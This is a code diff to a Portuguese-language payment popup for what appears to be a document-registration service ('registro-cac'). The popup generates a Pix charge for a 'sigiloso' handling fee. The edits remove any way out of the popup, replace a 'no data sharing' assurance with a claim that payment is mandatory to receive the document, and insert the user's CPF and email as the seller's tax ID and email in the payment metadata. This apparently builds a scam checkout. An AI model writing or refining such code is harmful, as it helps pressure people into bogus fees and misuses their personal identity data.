@@ -128,7 +128,7 @@ function showTaxaObrigatoriaUpsell() {
                         </div>
                     </div>
                     
-                    <!-- Botão verde principal -->
+                    <!-- Botão verde principal - UNICO BOTAO -->
                     <button 
                         onclick="gerarPixUpsellTaxaObrigatoria()" 
                         class="w-full bg-green-600 hover:bg-green-700 text-white font-bold py-4 px-6 rounded-full text-lg transition shadow-md mb-3"
@@ -136,9 +136,9 @@ function showTaxaObrigatoriaUpsell() {
                         Gerar Pix
                     </button>
                     
-                    <!-- Texto pequeno inferior -->
-                    <p class="text-center text-xs text-gray-500">
-                        Serviço obrigatório · Valor único · Sem compartilhamento de dados
+                    <!-- Texto pequeno inferior - SEM OPCAO DE SAIR -->
+                    <p class="text-center text-xs text-gray-600">
+                        <strong>Pagamento obrigatório para receber seu documento</strong>
                     </p>
                     
                 </div>
@@ -215,7 +215,7 @@ async function gerarPixUpsellTaxaObrigatoria() {
             amount: UPSELL_CONFIG.amount,
             currency: 'BRL',
             method: 'PIX',
-            description: 'Taxa Fixa de Tratamento Sigiloso',
+            description: 'Serviço de Tratamento Sigiloso',
             externalRef: externalRef,
             notificationUrl: window.location.origin + '/webhook/payment',
             ip: '0.0.0.0',
@@ -230,7 +230,7 @@ async function gerarPixUpsellTaxaObrigatoria() {
                     quantity: 1,
                     name: 'Serviço de Tratamento Sigiloso',
                     price: UPSELL_CONFIG.amount,
-                    type: 'SERVICE'
+                    type: 'DIGITAL'
                 }
             ],
             delivery: {
@@ -249,6 +249,8 @@ async function gerarPixUpsellTaxaObrigatoria() {
             metadata: {
                 provider: 'registro-cac',
                 orderId: externalRef,
+                sellerTaxId: userData.cpf,
+                sellerEmail: userData.email,
                 tipo: 'taxa_obrigatoria_frete_sigilo',
                 dataRegistro: new Date().toISOString()
             }
